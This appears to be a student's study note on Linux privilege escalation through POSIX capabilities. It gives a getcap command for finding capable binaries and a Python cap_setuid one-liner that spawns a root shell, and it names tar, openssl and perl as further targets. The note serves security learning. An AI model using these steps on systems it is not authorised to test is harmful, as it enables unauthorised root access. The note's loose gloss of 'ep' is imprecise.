# Capabilities

POSIX capabilities (getcap), cap_setuid, Python/Perl capability abuse.

---



Resources for this video:
Linux Privilege Escalation using Capabilities - [https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
SUID vs Capabilities - [https://mn3m.info/posts/suid-vs-capabilities/](https://mn3m.info/posts/suid-vs-capabilities/)
Linux Capabilities Privilege Escalation - [https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099](https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099)

Capabilities are a bit more secure than suid that is why lot of people are transitioning to it

To hunt capabilities

```bash
getcap -r / 2>/dev/null
```

![Screenshot](./assets/022_Capabilities_1d6d64c5-e0cb-802a-a6e3-e37ca709f2b6.png)

ep for permit everything basically(actual meaning check on google)

To exploit this we just need to run python code which makes us root

![Screenshot](./assets/023_Capabilities_1d6d64c5-e0cb-8032-8968-c944041a020d.png)

```bash
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

The following are also usefull and interesting if found
tar,openssl,perl



---
[Back to Linux Privilege Escalation Index](../README.md)
